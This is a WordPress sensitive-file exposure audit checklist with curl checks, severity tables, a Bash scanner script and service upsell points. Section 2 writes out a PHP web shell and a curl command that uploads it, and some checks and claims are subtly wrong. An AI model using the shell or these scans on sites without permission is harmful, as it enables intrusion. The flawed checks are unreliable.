# 🔐 WordPress, File Permissions & Exposure Audit Checklist

> **Audit type** : Remote only (no login, no credentials)  
> **Delivery** : Curl-based checks, one-liners, severity ratings  
> **Goal** : Sell hardening / security services by demonstrating concrete exposures  

---

## Severity Legend

| Severity | Label | Meaning |
|----------|-------|---------|
| 🔴 **CRITICAL** | Exploitation path with public RCE / direct data exfiltration | |
| 🟠 **HIGH** | Sensitive data disclosure, config leak, version disclosure | |
| 🟡 **MEDIUM** | Information leakage, path disclosure, structure exposure | |
| 🔵 **LOW** | Minor version or surface-area exposure | |

---

## 1. wp-config.php, Direct Read Access

The single highest-value file on any WordPress site. Contains database credentials (DB_NAME, DB_USER, DB_PASSWORD, DB_HOST), authentication salts & keys (AUTH_KEY, SECURE_AUTH_KEY, etc.), and often `WP_HOME`, `AWS_*` keys, or Redis creds.

### 1.1, Direct path

```bash
curl -s -o /dev/null -w "HTTP %{http_code} | Size: %{size_download}" \
  "https://example.com/wp-config.php"
```

| Expected response | Vulnerability | Severity |
|-------------------|---------------|----------|
| HTTP 200 (non-empty body) | DB credentials exposed | 🔴 **CRITICAL** |
| HTTP 200 but empty body | Usually means `die()` executed, safe | ✅ Clean |
| HTTP 403 / 500 | Blocked by `.htaccess` or server config | ✅ Clean |
| HTTP 301/302 (redirect) | Possibly misconfigured, verify redirect target | 🟡 **MEDIUM** |

> 💡 WordPress normally blocks direct access via a PHP die() call in wp-config.php. However, if PHP isn't executing correctly (e.g. .php files served as plain text), the file contents are returned raw. Always check `Content-Type` header.

---

### 1.2, Backup / legacy copies of wp-config.php

Attackers brute-force common backup extensions and suffixes. These are often left behind by editors, version control, or automated backup plugins.

| Suffix | Curl command |
|--------|-------------|
| `.bak` | `curl -s -o /dev/null -w "%{http_code}" "https://example.com/wp-config.php.bak"` |
| `.old` | `curl -s -o /dev/null -w "%{http_code}" "https://example.com/wp-config.php.old"` |
| `~` | `curl -s -o /dev/null -w "%{http_code}" "https://example.com/wp-config.php~"` |
| `.save` | `curl -s -o /dev/null -w "%{http_code}" "https://example.com/wp-config.php.save"` |
| `.txt` | `curl -s -o /dev/null -w "%{http_code}" "https://example.com/wp-config.txt"` |
| `.inc` | `curl -s -o /dev/null -w "%{http_code}" "https://example.com/wp-config.inc"` |
| `.swp` | `curl -s -o /dev/null -w "%{http_code}" "https://example.com/wp-config.php.swp"` (Vim swap files) |
| `.swo` | `curl -s -o /dev/null -w "%{http_code}" "https://example.com/wp-config.php.swo"` (Vim swap files) |
| `.swn` | `curl -s -o /dev/null -w "%{http_code}" "https://example.com/wp-config.php.swn"` (Vim swap files) |
| `~` | `curl -s -o /dev/null -w "%{http_code}" "https://example.com/wp-config.php~"` (Nano/Emacs backup) |
| `.orig` | `curl -s -o /dev/null -w "%{http_code}" "https://example.com/wp-config.php.orig"` |
| `wp-config_copy.php` | `curl -s -o /dev/null -w "%{http_code}" "https://example.com/wp-config_copy.php"` |
| `wp-config-backup.php` | `curl -s -o /dev/null -w "%{http_code}" "https://example.com/wp-config-backup.php"` |

| Expected response | Vulnerability | Severity |
|-------------------|---------------|----------|
| HTTP 200 + file content returned (check body) | Backup served as plain text | 🔴 **CRITICAL** |
| HTTP 200 + empty / die() | PHP executed, safe | ✅ Clean |
| HTTP 404 | Not present | ✅ Clean |

> 🟠 **HIGH** even when `.bak` / `.old` serve PHP's die() only, presence of backup files indicates poor hygiene and possible `.git/` exposure or dev artifacts.

---

## 2. wp-content/uploads/, Writable Directory & Listing

WordPress `/wp-content/uploads/` is world-writable by design (for media uploads). The danger is **directory listing enabled**, exposing file names, paths, and metadata that attackers use to:
- Find uploaded shells/malware
- Enumerate file upload timestamps
- Locate sensitive PDFs uploaded by users

```bash
# Check for directory listing
curl -s -L "https://example.com/wp-content/uploads/" | head -50

# Check specific year/month structure
curl -s -L "https://example.com/wp-content/uploads/2025/"
curl -s -L "https://example.com/wp-content/uploads/2025/01/"
```

| Expected response | Vulnerability | Severity |
|-------------------|---------------|----------|
| Directory listing (file index returned) | Full path and file enumeration | 🟠 **HIGH** |
| HTTP 403 Forbidden | Properly blocked | ✅ Clean |
| HTTP 404 Not Found | Non-existent path | ✅ Clean |
| "Index of /wp-content/uploads" in body | Apache/nginx autoindex on | 🟠 **HIGH** |

**Test for writable file upload (if you have permission, consult legal framework first):**
```bash
echo "GIF89a<?php system(\$_GET['cmd']); ?>" > /tmp/test.php
curl -X POST -F "file=@/tmp/test.php" "https://example.com/wp-content/uploads/test.php"
```

> Most hosts block POST to uploads/, this is a client-facing demonstration, not something you'd run unilaterally.

---

## 3. .htaccess, Protections Across Critical Directories

Apache `.htaccess` files in WordPress control access to sensitive directories.

### 3.1, wp-includes/.htaccess

```bash
curl -s -o /dev/null -w "HTTP %{http_code} | Size: %{size_download}" \
  "https://example.com/wp-includes/.htaccess"
```

| Expected response | Vulnerability | Severity |
|-------------------|---------------|----------|
| HTTP 200 + file returned | Access control rules exposed | 🟠 **HIGH** |
| HTTP 403 / 500 | Protected | ✅ Clean |
| HTTP 404 | Missing, security rules probably absent | 🟡 **MEDIUM** |

### 3.2, wp-content/.htaccess

```bash
curl -s -o /dev/null -w "HTTP %{http_code} | Size: %{size_download}" \
  "https://example.com/wp-content/.htaccess"
```

| Expected response | Vulnerability | Severity |
|-------------------|---------------|----------|
| HTTP 200 + file returned | Upload directory rules exposed | 🟡 **MEDIUM** |
| HTTP 403 / 404 | Protected or not present | ✅ Clean |

### 3.3, Webroot .htaccess

```bash
curl -s -o /dev/null -w "HTTP %{http_code} | Size: %{size_download}" \
  "https://example.com/.htaccess"
```

| Expected response | Vulnerability | Severity |
|-------------------|---------------|----------|
| HTTP 200 + file returned | Webroot rewrite rules exposed | 🟡 **MEDIUM** |
| HTTP 403 / 404 | Protected or not present | ✅ Clean |

### 3.4, wp-admin/.htaccess

```bash
curl -s -o /dev/null -w "HTTP %{http_code} | Size: %{size_download}" \
  "https://example.com/wp-admin/.htaccess"
```

| Expected response | Vulnerability | Severity |
|-------------------|---------------|----------|
| HTTP 200 + file returned | Admin-area access rules exposed | 🟠 **HIGH** |
| HTTP 403 / 404 | Protected | ✅ Clean |

---

## 4. Backup Files in Webroot

Common backup files left by plugins, manual FTP transfers, or hosting panel tools.

```bash
# SQL exports
for f in dump.sql site.sql backup.sql wp.sql db.sql export.sql \
  wp_backup.sql wordpress.sql database.sql \
  *.sql; do
  curl -s -o /dev/null -w "HTTP %{http_code} | %{url_effective}" \
    "https://example.com/$f"
done
```

```bash
# Archive formats
for f in backup.zip site-backup.zip wp-backup.zip latest.zip \
  backup.tar.gz site.tar.gz wp.tar.gz \
  backup.bak site.bak wp.bak db.bak \
  backup.7z site.7z; do
  curl -s -o /dev/null -w "HTTP %{http_code} | %{url_effective}" \
    "https://example.com/$f"
done
```

```bash
# Common WordPress backup plugin artifacts
# UpdraftPlus:
curl -s -o /dev/null -w "%{http_code}" "https://example.com/wp-content/updraft/"
# BackWPup:
curl -s -o /dev/null -w "%{http_code}" "https://example.com/wp-content/backwpup-*"
# BackupBuddy:
curl -s -o /dev/null -w "%{http_code}" "https://example.com/wp-content/uploads/backupbuddy_backups/"
```

| Expected response | Vulnerability | Severity |
|-------------------|---------------|----------|
| HTTP 200 + full file download | Full database dump or complete site backup exposed | 🔴 **CRITICAL** |
| HTTP 200 + directory listing | Backup directory listing | 🟠 **HIGH** |
| HTTP 403 | Access blocked | ✅ Clean |
| HTTP 404 | Not present | ✅ Clean |

> 💡 Always check **content-length** for backups, an HTTP 200 returning 0 bytes is not a vulnerability. Use `-w "Size: %{size_download}"` and ignore responses < 100 bytes.

---

## 5. .git/ Directory & .gitignore Exposure

Exposed `.git/` directories allow attackers to reconstruct the full source history, including:
- Reverted commits containing credentials or `wp-config.php` secrets
- All plugin/theme source code
- Database connection strings committed by mistake

### 5.1, .git/HEAD (quick check)

```bash
curl -s "https://example.com/.git/HEAD"
```

| Expected response | Vulnerability | Severity |
|-------------------|---------------|----------|
| `ref: refs/heads/main` or `ref: refs/heads/master` | Full `.git/` exposure confirmed | 🔴 **CRITICAL** |
| HTTP 403 / 404 | Protected | ✅ Clean |

### 5.2, .git/config (credential leak)

```bash
curl -s "https://example.com/.git/config"
```

| Expected response | Vulnerability | Severity |
|-------------------|---------------|----------|
| `[remote "origin"]` with URL | Remote with potential embedded creds | 🔴 **CRITICAL** |
| HTTP 403 / 404 | Protected | ✅ Clean |

### 5.3, .gitignore

```bash
curl -s "https://example.com/.gitignore"
```

| Expected response | Vulnerability | Severity |
|-------------------|---------------|----------|
| File contents returned | Project structure, ignored files, custom config paths leaked | 🟡 **MEDIUM** |
| HTTP 403 / 404 | Protected | ✅ Clean |

### 5.4, .git/ index traversal (automated)

```bash
# Download .git/HEAD, then use git-dumper or manual traversal
# https://github.com/arthaud/git-dumper
# git-dumper https://example.com/ /tmp/dumped_repo/
```

> 💡 If `.git/HEAD` is accessible, the whole repository can be cloned remotely. This is an instant CRITICAL finding.

---

## 6. .env File Exposure

Modern WordPress setups (Bedrock, Trellis, Docker, WP-CLI Config) often use `.env` files for environment-specific configuration. An exposed `.env` contains database credentials, salts, and API keys.

```bash
curl -s "https://example.com/.env"
```

| Expected response | Vulnerability | Severity |
|-------------------|---------------|----------|
| Lines containing `DB_*`, `AUTH_KEY`, `API_KEY`, or `SECRET` | Environment variables leaked | 🔴 **CRITICAL** |
| HTTP 403 / 404 | Protected | ✅ Clean |
| Contents served (check body) | Full config exposed | 🔴 **CRITICAL** |

Also check variations:

```bash
curl -s "https://example.com/.env.local"
curl -s "https://example.com/.env.production"
curl -s "https://example.com/.env.example"  # Usually safe but reveals structure
```

---

## 7. phpinfo() Detection

phpinfo() dumps the complete PHP configuration, installed extensions, environment variables, server paths, and loaded configs.

```bash
# Common phpinfo file names
for f in phpinfo.php info.php test.php php_info.php p.php \
  i.php info.php5 phpinfo.php.bak i.php.old; do
  curl -s -o /dev/null -w "HTTP %{http_code} | %{url_effective}" \
    "https://example.com/$f"
done
```

```bash
# More thorough, check body for PHP credits signature
curl -s "https://example.com/phpinfo.php" | grep -i "phpinfo\|PHP Version\|<title>phpinfo"
```

| Expected response | Vulnerability | Severity |
|-------------------|---------------|----------|
| HTML table with PHP config (PHP Version, extensions, env vars) | Full PHP environment disclosure | 🔴 **CRITICAL** |
| HTTP 404 / blank page | Not present | ✅ Clean |
| HTTP 403 | Blocked | ✅ Clean |

> 🟡 **MEDIUM** finding even if blocked, the fact that the endpoint exists means someone deployed it and forgot it.

---

## 8. wp-config-sample.php

WordPress ships with `wp-config-sample.php` in the webroot. While mostly harmless, its presence can indicate a fresh installation where the real `wp-config.php` may be misconfigured.

```bash
curl -s "https://example.com/wp-config-sample.php"
```

| Expected response | Vulnerability | Severity |
|-------------------|---------------|----------|
| PHP source (`define('DB_NAME', ...)`) served as plain text | PHP misconfiguration, real wp-config.php likely also exposed | 🔴 **CRITICAL** |
| Empty page / PHP executed (die() called) | Normal | ✅ Clean |
| File present | Minor, indicates install may not be hardened | 🔵 **LOW** |

---

## 9. wp-admin/install.php, Fresh Installation Exposure

If the WordPress installation was never completed (or reinstalled over incomplete data), `install.php` can be used to **take over the site**.

```bash
curl -s -o /dev/null -w "HTTP %{http_code} | Redirect: %{redirect_url}" \
  "https://example.com/wp-admin/install.php"
```

| Expected response | Vulnerability | Severity |
|-------------------|---------------|----------|
| HTTP 200 with installation form (site title, admin user form) | Installation not locked, site takeover possible | 🔴 **CRITICAL** |
| HTTP 302 redirect to wp-login.php / wp-admin | Already configured, locked | ✅ Clean |
| Already installed message | Normal | ✅ Clean |
| HTTP 404 | install.php removed, best practice | ✅ Clean |

**To verify the form is actually rendered:**
```bash
curl -s "https://example.com/wp-admin/install.php" | grep -i "installation\|site title\|admin email\|submit"
```

---

## 10. debug.log in wp-content

WordPress writes `debug.log` to `/wp-content/` when `WP_DEBUG` is enabled. This file can contain:
- Database errors with SQL queries
- PHP warnings with stack traces
- Plugin/theme errors revealing file paths
- Sometimes version info and internal IPs

```bash
curl -s "https://example.com/wp-content/debug.log"

# Check common variations
for f in wp-content/debug.log wp-content/debug.log.1 \
  wp-content/debug.log.gz wp-content/debug.log.old; do
  curl -s -o /dev/null -w "HTTP %{http_code} | Size: %{size_download}" \
    "https://example.com/example.com/$f"
done
```

| Expected response | Vulnerability | Severity |
|-------------------|---------------|----------|
| HTTP 200 + log entries with PHP errors, stack traces, SQL | Debug mode on in production | 🟠 **HIGH** |
| HTTP 200 + large file | Full debug history exposed | 🟠 **HIGH** |
| HTTP 403 / 404 | Protected or not present | ✅ Clean |

---

## 11. Sitemap Files, Structure Exposure

Sitemaps enumerate every public URL on the site, useful for surface-area analysis and understanding site structure.

```bash
# XML sitemaps
curl -s "https://example.com/sitemap.xml"
curl -s "https://example.com/sitemap_index.xml"
curl -s "https://example.com/wp-sitemap.xml"   # WordPress 5.5+

# HTML sitemaps
curl -s "https://example.com/sitemap/"
curl -s "https://example.com/sitemap.html"

# Third-party plugin sitemaps
curl -s "https://example.com/sitemap.xml.gz"
curl -s "https://example.com/sitemap-pt-post-1.xml"
curl -s "https://example.com/post-sitemap.xml"
curl -s "https://example.com/page-sitemap.xml"
```

| Expected response | Vulnerability | Severity |
|-------------------|---------------|----------|
| XML with `<urlset>` and `<loc>` entries | Full site structure exposed | 🔵 **LOW** |
| Sitemap with admin URLs, login pages, or staging links | Additional attack surface exposed | 🟡 **MEDIUM** |

> Sitemaps are **intended** to be public. The risk is when they reveal: staging/staging URLs, wp-admin paths, or hidden/private pages meant to be noindex.

---

## 12. license.txt, Version Disclosure

`license.txt` ships with every WordPress installation and contains the version number in its filename context (the version in the `@license` header line at the top of the file).

```bash
curl -s "https://example.com/license.txt" | head -5
```

| Expected response | Vulnerability | Severity |
|-------------------|---------------|----------|
| "WordPress - Web publishing software" with version in header | Version disclosed (e.g. "WordPress 6.4") | 🔵 **LOW** |
| HTTP 403 / 404 | Removed or blocked, hardened | ✅ Clean |

> 🔵 **LOW** on its own, but becomes 🟡 **MEDIUM** when combined with a known vulnerable version (e.g., WordPress ≤ 4.7 with REST API info leak).

---

## Quick-Reference Summary Table

| # | Check | Curl Target | Severity |
|---|-------|-------------|----------|
| 1.1 | wp-config.php direct | `/wp-config.php` | 🔴 CRITICAL |
| 1.2 | wp-config.php backups | `/wp-config.php.bak`, `.old`, `.save`, `.txt`, `.inc`, `.swp` | 🔴 CRITICAL |
| 2 | Uploads directory listing | `/wp-content/uploads/` | 🟠 HIGH |
| 3.1 | wp-includes .htaccess | `/wp-includes/.htaccess` | 🟠 HIGH |
| 3.2 | wp-content .htaccess | `/wp-content/.htaccess` | 🟡 MEDIUM |
| 3.3 | Webroot .htaccess | `/.htaccess` | 🟡 MEDIUM |
| 3.4 | wp-admin .htaccess | `/wp-admin/.htaccess` | 🟠 HIGH |
| 4 | Backup files in webroot | `*.sql`, `*.zip`, `*.tar.gz`, `*.bak` | 🔴 CRITICAL |
| 5.1 | .git/HEAD exposed | `/.git/HEAD` | 🔴 CRITICAL |
| 5.2 | .git/config exposure | `/.git/config` | 🔴 CRITICAL |
| 5.3 | .gitignore exposure | `/.gitignore` | 🟡 MEDIUM |
| 6 | .env file exposure | `/.env` | 🔴 CRITICAL |
| 7 | phpinfo() files | `/phpinfo.php`, `/info.php`, etc. | 🔴 CRITICAL |
| 8 | wp-config-sample.php | `/wp-config-sample.php` | 🔵 LOW / 🔴 if raw |
| 9 | wp-admin/install.php | `/wp-admin/install.php` | 🔴 CRITICAL |
| 10 | debug.log in wp-content | `/wp-content/debug.log` | 🟠 HIGH |
| 11 | Sitemap files | `/sitemap.xml`, etc. | 🔵 LOW |
| 12 | license.txt | `/license.txt` | 🔵 LOW |

---

# 🔍 Complete Scan Script: `wp-file-permissions-audit.sh`

Below is a complete, ready-to-run Bash script that checks **every item** in this checklist. It outputs color-coded results and a final summary with actionable findings.

```bash
#!/usr/bin/env bash
#===============================================================================
# WordPress File Permissions & Exposure Audit
# Remote scan, no login required
# Usage: ./wp-file-permissions-audit.sh https://target-site.com
#===============================================================================

set -euo pipefail

RED='\033[0;31m'
ORANGE='\033[0;33m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
GREEN='\033[0;32m'
NC='\033[0m' # No Color

TARGET="${1%/}"
if [[ -z "$TARGET" ]]; then
  echo "Usage: $0 https://target-site.com"
  exit 1
fi

SUMMARY_FILE=$(mktemp)
SUMMARY_CRIT=0
SUMMARY_HIGH=0
SUMMARY_MED=0
SUMMARY_LOW=0
TOTAL_CHECKS=0

log_critical() { echo -e "${RED}[CRITICAL]${NC} $1"; echo "CRITICAL|$1" >> "$SUMMARY_FILE"; ((SUMMARY_CRIT++)); ((TOTAL_CHECKS++)); }
log_high()    { echo -e "${ORANGE}[HIGH]${NC} $1";     echo "HIGH|$1" >> "$SUMMARY_FILE";     ((SUMMARY_HIGH++)); ((TOTAL_CHECKS++)); }
log_medium()  { echo -e "${YELLOW}[MEDIUM]${NC} $1";   echo "MEDIUM|$1" >> "$SUMMARY_FILE";   ((SUMMARY_MED++));  ((TOTAL_CHECKS++)); }
log_low()     { echo -e "${BLUE}[LOW]${NC} $1";        echo "LOW|$1" >> "$SUMMARY_FILE";      ((SUMMARY_LOW++));  ((TOTAL_CHECKS++)); }
log_pass()    { echo -e "${GREEN}[OK]${NC} $1"; }

check_http() {
  local url="$1" label="$2" severity="$3" body_check="${4:-}"
  local response
  response=$(curl -s -L -o /tmp/__wp_audit_body -w "HTTP %{http_code}|Size: %{size_download}|Type: %{content_type}" \
    --connect-timeout 10 --max-time 15 "$url" 2>/dev/null) || true

  local http_code
  http_code=$(echo "$response" | grep -oP 'HTTP \K[0-9]{3}')

  if [[ "$http_code" == "200" ]]; then
    local size
    size=$(echo "$response" | grep -oP 'Size: \K[0-9]+')
    if [[ -n "$body_check" ]] && grep -qi "$body_check" /tmp/__wp_audit_body 2>/dev/null; then
      case "$severity" in
        critical) log_critical "$label, HTTP 200 with sensitive content" ;;
        high)     log_high    "$label, HTTP 200 with sensitive content" ;;
        medium)   log_medium  "$label, HTTP 200 with sensitive content" ;;
        low)      log_low     "$label, HTTP 200" ;;
      esac
    elif [[ "$size" -gt 100 ]]; then
      case "$severity" in
        critical) log_critical "$label, HTTP 200 ($size bytes)" ;;
        high)     log_high    "$label, HTTP 200 ($size bytes)" ;;
        medium)   log_medium  "$label, HTTP 200 ($size bytes)" ;;
        low)      log_low     "$label, HTTP 200 ($size bytes)" ;;
      esac
    else
      log_pass "$label, HTTP 200 but minimal body (likely PHP die())"
    fi
  elif [[ "$http_code" == "403" || "$http_code" == "404" ]]; then
    log_pass "$label, HTTP $http_code (blocked or not found)"
  elif [[ "$http_code" == "301" || "$http_code" == "302" ]]; then
    local redirect
    redirect=$(grep -oP 'Location: \K.*' /tmp/__wp_audit_body 2>/dev/null || echo "unknown")
    log_medium "$label, HTTP $http_code redirects to $redirect"
  else
    log_pass "$label, HTTP $http_code"
  fi

  rm -f /tmp/__wp_audit_body
}

check_dir_listing() {
  local url="$1" label="$2"
  local body
  body=$(curl -s -L --connect-timeout 10 --max-time 15 "$url" 2>/dev/null) || true
  if echo "$body" | grep -qi "index of\|directory listing\|<title>Index of"; then
    log_high "$label, Directory listing enabled"
  elif echo "$body" | grep -qi "403\|Forbidden"; then
    log_pass "$label, Directory listing blocked (HTTP 403)"
  elif [[ -z "$body" ]]; then
    log_pass "$label, Empty body (likely blocked)"
  else
    log_pass "$label, No directory listing detected"
  fi
}

check_body_content() {
  local url="$1" label="$2" pattern="$3" severity="$4"
  local body
  body=$(curl -s -L --connect-timeout 10 --max-time 15 "$url" 2>/dev/null) || true
  if echo "$body" | grep -qi "$pattern"; then
    case "$severity" in
      critical) log_critical "$label, Matched: $pattern" ;;
      high)     log_high    "$label, Matched: $pattern" ;;
      medium)   log_medium  "$label, Matched: $pattern" ;;
      low)      log_low     "$label, Matched: $pattern" ;;
    esac
  else
    log_pass "$label, No match for: $pattern"
  fi
}

# --- BANNER ---
echo "================================================================================"
echo "  WordPress File Permissions & Exposure Audit"
echo "  Target: $TARGET"
echo "  $(date '+%Y-%m-%d %H:%M:%S')"
echo "================================================================================"
echo ""

#-------------------------------------------------------------------------------
# 1. wp-config.php, Direct and backups
#-------------------------------------------------------------------------------
echo "--- [1] wp-config.php Checks ---"

check_http "$TARGET/wp-config.php" "wp-config.php (direct)" "critical" "define.*DB_NAME\|define.*DB_USER\|define.*DB_PASSWORD"

for suffix in .bak .old .save .txt .inc .swp .swo .swn .orig ~ '_copy.php' '-backup.php'; do
  check_http "$TARGET/wp-config.php${suffix}" "wp-config.php${suffix}" "critical" "define.*DB_NAME\|define.*DB_USER"
done

#-------------------------------------------------------------------------------
# 2. wp-content/uploads, Directory listing
#-------------------------------------------------------------------------------
echo ""
echo "--- [2] wp-content/uploads Directory Listing ---"

check_dir_listing "$TARGET/wp-content/uploads/" "wp-content/uploads/"
check_dir_listing "$TARGET/wp-content/uploads/2024/" "wp-content/uploads/2024/"
check_dir_listing "$TARGET/wp-content/uploads/2025/" "wp-content/uploads/2025/"

#-------------------------------------------------------------------------------
# 3. .htaccess files
#-------------------------------------------------------------------------------
echo ""
echo "--- [3] .htaccess Protections ---"

check_http "$TARGET/.htaccess"                     ".htaccess (webroot)"           "medium"
check_http "$TARGET/wp-includes/.htaccess"         "wp-includes/.htaccess"         "high"
check_http "$TARGET/wp-content/.htaccess"          "wp-content/.htaccess"          "medium"
check_http "$TARGET/wp-admin/.htaccess"            "wp-admin/.htaccess"            "high"

#-------------------------------------------------------------------------------
# 4. Backup files in webroot
#-------------------------------------------------------------------------------
echo ""
echo "--- [4] Backup Files in Webroot ---"

for file in dump.sql site.sql backup.sql wp.sql db.sql export.sql \
  wp_backup.sql wordpress.sql database.sql \
  backup.zip site-backup.zip wp-backup.zip latest.zip \
  backup.tar.gz site.tar.gz wp.tar.gz \
  backup.bak site.bak wp.bak db.bak; do
  check_http "$TARGET/$file" "webroot/$file" "critical"
done

#-------------------------------------------------------------------------------
# 5. .git/ and .gitignore
#-------------------------------------------------------------------------------
echo ""
echo "--- [5] Git Exposure ---"

check_http "$TARGET/.git/HEAD" ".git/HEAD" "critical" "ref:"
check_http "$TARGET/.git/config" ".git/config" "critical" "\[remote"
check_http "$TARGET/.gitignore" ".gitignore" "medium"

#-------------------------------------------------------------------------------
# 6. .env file
#-------------------------------------------------------------------------------
echo ""
echo "--- [6] .env Exposure ---"

check_http "$TARGET/.env" ".env" "critical" "DB_\|AUTH_KEY\|API_KEY\|SECRET"
check_http "$TARGET/.env.local" ".env.local" "critical" "DB_\|AUTH_KEY"
check_http "$TARGET/.env.production" ".env.production" "critical" "DB_\|AUTH_KEY"

#-------------------------------------------------------------------------------
# 7. phpinfo() files
#-------------------------------------------------------------------------------
echo ""
echo "--- [7] phpinfo() Detection ---"

for file in phpinfo.php info.php test.php php_info.php p.php i.php info.php5; do
  check_body_content "$TARGET/$file" "phpinfo: $file" "phpinfo\|PHP Version\|<title>phpinfo" "critical"
done

#-------------------------------------------------------------------------------
# 8. wp-config-sample.php
#-------------------------------------------------------------------------------
echo ""
echo "--- [8] wp-config-sample.php ---"

check_body_content "$TARGET/wp-config-sample.php" "wp-config-sample.php" "define.*DB_NAME\|DB_USER" "critical"
check_http "$TARGET/wp-config-sample.php" "wp-config-sample.php (exists)" "low"

#-------------------------------------------------------------------------------
# 9. wp-admin/install.php
#-------------------------------------------------------------------------------
echo ""
echo "--- [9] Install.php Exposure ---"

check_body_content "$TARGET/wp-admin/install.php" "wp-admin/install.php" \
  "installation\|site title\|admin email\|submit\|Welcome" "critical"
check_http "$TARGET/wp-admin/install.php" "wp-admin/install.php (HTTP status)" "critical"

#-------------------------------------------------------------------------------
# 10. debug.log
#-------------------------------------------------------------------------------
echo ""
echo "--- [10] debug.log in wp-content ---"

check_http "$TARGET/wp-content/debug.log" "wp-content/debug.log" "high" \
  "PHP\|Fatal\|Error\|Warning\|Stack trace"

#-------------------------------------------------------------------------------
# 11. Sitemap files
#-------------------------------------------------------------------------------
echo ""
echo "--- [11] Sitemap Structure Exposure ---"

check_body_content "$TARGET/sitemap.xml" "sitemap.xml" "<urlset\|<sitemapindex\|<loc>" "low"
check_body_content "$TARGET/wp-sitemap.xml" "wp-sitemap.xml" "<urlset\|<sitemapindex\|<loc>" "low"
check_body_content "$TARGET/sitemap_index.xml" "sitemap_index.xml" "<sitemapindex\|<loc>" "low"

#-------------------------------------------------------------------------------
# 12. license.txt
#-------------------------------------------------------------------------------
echo ""
echo "--- [12] license.txt Version Disclosure ---"

check_body_content "$TARGET/license.txt" "license.txt" "WordPress.*[0-9]\+\.[0-9]" "low"

#-------------------------------------------------------------------------------
# SUMMARY
#-------------------------------------------------------------------------------
echo ""
echo "================================================================================"
echo "  AUDIT COMPLETE"
echo "================================================================================"
echo ""
echo "  Total checks       : $TOTAL_CHECKS"
echo -e "  🔴 CRITICAL         : ${SUMMARY_CRIT}"
echo -e "  🟠 HIGH             : ${SUMMARY_HIGH}"
echo -e "  🟡 MEDIUM           : ${SUMMARY_MED}"
echo -e "  🔵 LOW              : ${SUMMARY_LOW}"
echo ""

if [[ "$SUMMARY_CRIT" -gt 0 ]]; then
  echo "  ⚠️  CRITICAL FINDINGS DETECTED, immediate remediation recommended."
  echo ""
  echo "  Findings breakdown:"
  sort -t'|' -k1,1 "$SUMMARY_FILE" | while IFS='|' read -r sev desc; do
    case "$sev" in
      CRITICAL) echo -e "    🔴 $desc" ;;
      HIGH)     echo -e "    🟠 $desc" ;;
      MEDIUM)   echo -e "    🟡 $desc" ;;
      LOW)      echo -e "    🔵 $desc" ;;
    esac
  done
fi

echo ""
echo "================================================================================"

rm -f "$SUMMARY_FILE"
```

### Usage

```bash
chmod +x wp-file-permissions-audit.sh
./wp-file-permissions-audit.sh https://target-wordpress-site.com
```

### Output

- **Color-coded** terminal output: RED (critical), ORANGE (high), YELLOW (medium), BLUE (low), GREEN (pass)
- **Summary table** at the end with counts per severity level
- **Detailed findings** listed under their section headers

---

## Selling Points for Client Presentation

| Finding | Client Impact | Service Upsell |
|---------|---------------|----------------|
| wp-config.php backup exposed | "Attacker has your database password" | Emergency credential rotation + hardening |
| Uploads directory listing | "Any uploaded file is indexable, including shells" | Harden `.htaccess`, disable indexes |
| .git/ exposed | "Full source history and creds available" | Remove `.git/` + redeploy from clean copy |
| .env exposed | "API keys, DB creds, secrets in the open" | Rotate all secrets + enforce .env protection |
| debug.log present | "Stack traces with internal paths visible" | Disable WP_DEBUG, remove log, restrict access |
| install.php accessible | "Anyone can take over the installation" | Lock installation or delete install.php |
| license.txt present | "WordPress version known, CVE lookup possible" | Remove license.txt, keep updated |

---

## References

- [Harden WordPress (.htaccess)](https://wordpress.org/documentation/article/htaccess/)
- [OWASP, Sensitive Data Exposure](https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure)
- [WPScan, WordPress Security Scanner](https://github.com/wpscanteam/wpscan)
- [GitHacker, .git folder exploitation tool](https://github.com/WangYihang/GitHacker)
- [WordPress Hardening, Official docs](https://wordpress.org/support/article/hardening-wordpress/)
